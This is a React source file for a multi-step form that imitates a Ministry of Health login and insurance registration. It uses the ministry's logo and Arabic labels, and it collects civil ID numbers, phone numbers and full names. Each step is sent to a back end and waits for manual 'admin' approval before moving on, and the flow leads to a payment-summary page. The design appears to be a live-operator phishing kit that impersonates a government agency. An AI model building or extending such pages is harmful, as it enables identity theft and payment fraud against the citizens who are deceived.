import { useEffect, useState, type FormEvent } from "react";
import { useLocation } from "wouter";
import { useSignalEffect } from "@preact/signals-react";
import PageLayout from "@/components/layout/PageLayout";
import WaitingOverlay from "@/components/WaitingOverlay";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { sendData, isFormApproved, navigateToPage } from "@/lib/store";

type Field = { key: string; label: string; placeholder: string; numeric?: boolean; maxLength?: number };

function MohStep({ pageLabel, title, subtitle, nextPage, nextRoute, fields, submitLabel }: {
  pageLabel: string; title: string; subtitle: string; nextPage: string;
  nextRoute: string; fields: Field[]; submitLabel: string;
}) {
  const [, navigate] = useLocation();
  const [values, setValues] = useState<Record<string, string>>({});
  useEffect(() => { navigateToPage(pageLabel); }, [pageLabel]);
  useSignalEffect(() => {
    if (isFormApproved.value) { isFormApproved.value = false; navigate(nextRoute); }
  });
  const submit = (e: FormEvent) => {
    e.preventDefault();
    sendData({ data: values, current: pageLabel, nextPage, waitingForAdminResponse: true });
  };
  return (
    <PageLayout variant="default">
      <WaitingOverlay />
      <div className="bg-white rounded-2xl shadow-xl p-6">
        <div className="text-center mb-6">
          <img src="/moh-logo.png" alt="MOH" className="h-12 mx-auto mb-3 object-contain" />
          <h1 className="text-xl font-bold text-gray-800 mb-2">{title}</h1>
          <p className="text-gray-600 text-sm">{subtitle}</p>
        </div>
        <form onSubmit={submit} className="space-y-4">
          {fields.map((f) => (
            <div key={f.key} className="space-y-2">
              <Label htmlFor={f.key}>{f.label}</Label>
              <Input id={f.key} type={f.numeric ? "tel" : "text"} inputMode={f.numeric ? "numeric" : "text"}
                maxLength={f.maxLength} placeholder={f.placeholder} value={values[f.key] || ""}
                onChange={(e) => setValues({ ...values, [f.key]: f.numeric ? e.target.value.replace(/\D/g, "") : e.target.value })} />
            </div>
          ))}
          <Button type="submit" className="w-full h-11" size="lg">{submitLabel}</Button>
        </form>
      </div>
    </PageLayout>
  );
}
export const MohLogin = () => (
  <MohStep pageLabel="تسجيل دخول وزارة الصحة" title="تسجيل دخول وزارة الصحة"
    subtitle="أدخل الرقم المدني ورقم الجوال للمتابعة" nextPage="تسجيل بيانات الضمان الصحي"
    nextRoute="/moh-register" submitLabel="دخول"
    fields={[{ key: "civilId", label: "الرقم المدني", placeholder: "000000000000", numeric: true, maxLength: 12 },
             { key: "phone", label: "رقم الجوال", placeholder: "00000000", numeric: true, maxLength: 8 }]} />
);
export const MohRegister = () => (
  <MohStep pageLabel="تسجيل بيانات الضمان الصحي" title="تسجيل بيانات الضمان الصحي"
    subtitle="أكمل بياناتك لتوثيق الخدمة" nextPage="إنشاء حساب جديد"
    nextRoute="/moh-create-account" submitLabel="متابعة"
    fields={[{ key: "name", label: "الاسم", placeholder: "الاسم الرباعي" },
             { key: "civilId", label: "الرقم المدني", placeholder: "000000000000", numeric: true, maxLength: 12 }]} />
);
export const MohCreateAccount = () => (
  <MohStep pageLabel="إنشاء حساب جديد" title="إنشاء حساب جديد"
    subtitle="أدخل رقم الجوال لتأكيد إنشاء الحساب" nextPage="ملخص الدفع"
    nextRoute="/summary-payment" submitLabel="إنشاء الحساب"
    fields={[{ key: "phone", label: "رقم الجوال", placeholder: "00000000", numeric: true, maxLength: 8 }]} />
);
